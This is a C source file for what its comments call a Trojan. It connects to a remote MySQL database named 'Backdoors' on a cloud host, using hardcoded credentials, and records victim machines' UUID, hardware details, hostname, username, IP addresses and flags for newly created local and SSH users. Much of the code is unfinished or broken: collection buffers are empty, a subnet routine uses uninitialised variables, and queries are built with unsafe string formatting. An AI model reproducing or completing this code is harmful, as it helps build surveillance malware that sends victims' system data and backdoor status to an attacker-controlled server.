#include <stdio.h>
#include <stdlib.h>
#include <math.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netdb.h>
#include <ifaddrs.h>
#include <unistd.h>
#include <string.h>
#include <mysql.h>
#include <string.h>


int conceptretrieve(){
	struct ifaddrs *ip;
	FILE * proc;
	int c;
	c = getifaddrs(&ip);
	printf("Network address %s : - %d\n",ip->ifa_name,ip->ifa_addr);
	proc = fopen("/proc/cpuinfo","r");
	while(1){
		c = fgetc(proc);
		if( feof(proc) ){
			break;
		}	
		printf("%c",c);
	}
	fclose(proc);

	return 0;
}


int subnetCalculator(){ // Not fully implemented -- just conceptual -- Will likely split into multiplefunctions
	/* OCT variable for each octet x.x.x.x and CIDR for mask */
	int OCT0, OCT1, OCT2, OCT3, CIDR, numOfSubnets, numOfHosts; 
	/* Finding IP class */
	char class;	

	/* Conditional statement to remove invalid IP addresses */
	if( ((OCT0 < 0) || (OCT1 < 0) || (OCT2 < 0) || (OCT3 < 0)) || 
	((OCT0 > 255) || (OCT1 > 255) || (OCT2 > 255) || (OCT3 > 255)) || 
	((OCT0 == 127)) || 
	((OCT0 == 0) && (OCT1 == 0) && (OCT2 == 0) && (OCT3 == 0)) ){
		
		return -1; // Conceptual; requery user for a correct IP
	}

	/* Conditional statement to remove invalid CIDR */
	if(CIDR > 32 || CIDR < 0){
		return -1; // Conceptual; requery user for a correct CIDR
	}
	
	/* Conditional statement to assign IP class */
	if(OCT0 <=127){ // Assigning Class
		class = 'A';
		if(CIDR>=8){
			numOfSubnets = pow(2,CIDR-8);
		} else{
			numOfSubnets = pow(2,8-CIDR);
		}
		numOfHosts = pow(2,32-CIDR)-2;
	}else if (OCT0 <=192){
		class = 'B';
		if(CIDR>=16){
			numOfSubnets = pow(2,CIDR-16);
		} else{
			numOfSubnets = pow(2,18-CIDR);
		}
		numOfHosts = pow(2,32-CIDR)-2;
	} else{
		class = 'C';
		if(CIDR>=16){numOfSubnets = pow(2,CIDR-16);}
		else{numOfSubnets = pow(2,18-CIDR);}
		numOfHosts = pow(2,32-CIDR)-2;
	}
	
	
}


int main()
{
//Defining Device Extraction variables.  Accounted for End-of-String character.  Char length matches max length defined in the database
	char UUID[51] = "8284246F-05X13-1945-90DD-DD6D00E95954";
	char lshw[13001] = "";
	char lscpu[501] = "";
	char lsblk[3001] = "";
	char datetime[20] = "";		//Format: 'YYYY-MM-DD hh:mm:ss'
	
	//Defining RunLog Extraction variables
	char KernelVer[51] = "";
	char Hostname[256] = "";
	char Username[33] = "";
	char KernelRelease[21] = "";
	char TimeRun[20] = "";		//Format: 'YYYY-MM-DD hh:mm:ss'
	char lsusb[101] = "";
	char LocalIP[16] = "";
	char ExternalIP[16] = "";
	char GatewayIP[16] = "";
	char NewLocalUser[2] = "";
	char SSHserver[2] = "";
	char NewSSHuser[2] = "";

	//Defining Database variables
	MYSQL *conn;
	conn = mysql_init(NULL);
	MYSQL_RES *res;
	MYSQL_ROW row;
	char *server = "mysqldatabase.cvnrdza49fyl.us-east-2.rds.amazonaws.com";
	char *user = "Farrington";
	char *password = "ClaySiltSand";
	char *database = "Backdoors";
	char prepairedStatement [16600] = "";
 
	//Making the connection to the database
	if (!mysql_real_connect(conn, server, user, password, database, 0, NULL, 0))
	{
	 	printf("Connection Failed... Error: %s\n", mysql_error(conn));
		return 0;
	}
 	else
 	{
 		printf("Connection Sucessful\n");
	} 	

 	//Finding if this is the first time the Trojan ran on this machine
 	mysql_query(conn, "SELECT UUID FROM Device");
 	res = mysql_use_result(conn);
 	char UUIDs[51];	//temp for checking UUID values
 	int duplicate = 0;	//1 = duplicate
 	while ((row = mysql_fetch_row(res)) != NULL)
	{
		strncpy(UUIDs, row[0], 50);
		if(strncmp(UUIDs, UUID, 50) == 0)
		{
			printf("COPY DETECTED\n");
			duplicate = 1;
		}	
		//printf("%s \n", UUIDs);
	}
	
	//If this is the first time this PC ran this trojan, log Device info
	if (duplicate == 0)
	{
		//Creating the prepaired statement
		sprintf(prepairedStatement, "INSERT INTO Device VALUES ('%s','%s','%s','%s','%s')", UUID, lshw, lscpu, lsblk, datetime);
		//printf("%s", prepairedStatement);
		
		//Runs the INSERT query to Device Table
		if(mysql_query(conn, prepairedStatement) != 0)
		{
			printf("Query Failed.  Error: %s\n", mysql_error(conn));
		}
	}
	
	//RunLog INSERT
	sprintf(prepairedStatement, "INSERT INTO RunLog VALUES (0,'%s','%s','%s','%s','%s','%s','%s','%s','%s','%s','%s','%s','%s')", UUID,KernelVer,Hostname,Username,KernelRelease,TimeRun,lsusb,LocalIP,ExternalIP,GatewayIP,NewLocalUser,SSHserver,NewSSHuser);

	//Runs the INSERT query to RunLog Table
	if(mysql_query(conn, prepairedStatement) != 0)
	{
		printf("Query Failed.  Error: %s\n", mysql_error(conn));
	}


	int i = conceptretrieve();

 
}


